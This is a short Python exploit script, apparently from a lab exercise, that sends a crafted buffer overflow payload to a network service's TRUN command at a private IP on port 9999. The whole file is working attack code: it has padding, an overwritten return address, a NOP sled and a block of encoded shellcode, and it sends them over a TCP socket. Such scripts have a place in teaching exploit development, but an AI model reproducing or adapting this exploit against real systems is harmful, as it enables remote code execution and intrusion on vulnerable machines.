#!/usr/bin/python
import socket

# TRUN is a a valid command for the program, vulnerable to buffer overflow
buf = "TRUN /.:/"
 
# buffer
buf += "A" * 2003

# eip
buf += "\xA0\x12\x50\x62"

#NOP
buf += "\x90" * 20

#  Shellcode
buf += b"\xba\x43\x55\x44\x1d\xdb\xd7\xd9\x74\x24\xf4\x58\x2b"
buf += b"\xc9\xb1\x52\x83\xc0\x04\x31\x50\x0e\x03\x13\x5b\xa6"
buf += b"\xe8\x6f\x8b\xa4\x13\x8f\x4c\xc9\x9a\x6a\x7d\xc9\xf9"
buf += b"\xff\x2e\xf9\x8a\xad\xc2\x72\xde\x45\x50\xf6\xf7\x6a"
buf += b"\xd1\xbd\x21\x45\xe2\xee\x12\xc4\x60\xed\x46\x26\x58"
buf += b"\x3e\x9b\x27\x9d\x23\x56\x75\x76\x2f\xc5\x69\xf3\x65"
buf += b"\xd6\x02\x4f\x6b\x5e\xf7\x18\x8a\x4f\xa6\x13\xd5\x4f"
buf += b"\x49\xf7\x6d\xc6\x51\x14\x4b\x90\xea\xee\x27\x23\x3a"
buf += b"\x3f\xc7\x88\x03\x8f\x3a\xd0\x44\x28\xa5\xa7\xbc\x4a"
buf += b"\x58\xb0\x7b\x30\x86\x35\x9f\x92\x4d\xed\x7b\x22\x81"
buf += b"\x68\x08\x28\x6e\xfe\x56\x2d\x71\xd3\xed\x49\xfa\xd2"
buf += b"\x21\xd8\xb8\xf0\xe5\x80\x1b\x98\xbc\x6c\xcd\xa5\xde"
buf += b"\xce\xb2\x03\x95\xe3\xa7\x39\xf4\x6b\x0b\x70\x06\x6c"
buf += b"\x03\x03\x75\x5e\x8c\xbf\x11\xd2\x45\x66\xe6\x15\x7c"
buf += b"\xde\x78\xe8\x7f\x1f\x51\x2f\x2b\x4f\xc9\x86\x54\x04"
buf += b"\x09\x26\x81\x8b\x59\x88\x7a\x6c\x09\x68\x2b\x04\x43"
buf += b"\x67\x14\x34\x6c\xad\x3d\xdf\x97\x26\x48\x12\x80\x3c"
buf += b"\x24\x50\xae\x51\xe9\xdd\x48\x3b\x01\x88\xc3\xd4\xb8"
buf += b"\x91\x9f\x45\x44\x0c\xda\x46\xce\xa3\x1b\x08\x27\xc9"
buf += b"\x0f\xfd\xc7\x84\x6d\xa8\xd8\x32\x19\x36\x4a\xd9\xd9"
buf += b"\x31\x77\x76\x8e\x16\x49\x8f\x5a\x8b\xf0\x39\x78\x56"
buf += b"\x64\x01\x38\x8d\x55\x8c\xc1\x40\xe1\xaa\xd1\x9c\xea"
buf += b"\xf6\x85\x70\xbd\xa0\x73\x37\x17\x03\x2d\xe1\xc4\xcd"
buf += b"\xb9\x74\x27\xce\xbf\x78\x62\xb8\x5f\xc8\xdb\xfd\x60"
buf += b"\xe5\x8b\x09\x19\x1b\x2c\xf5\xf0\x9f\x5c\xbc\x58\x89"
buf += b"\xf4\x19\x09\x8b\x98\x99\xe4\xc8\xa4\x19\x0c\xb1\x52"
buf += b"\x01\x65\xb4\x1f\x85\x96\xc4\x30\x60\x98\x7b\x30\xa1"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create TCP IPv4
s.connect(("10.50.29.188", 9999))  # Connect to target IP and port
print(s.recv(1024))  # print response
s.send(buf)  # send the value of bug
print(s.recv(1024))  # print the response
s.close()  # close the socket

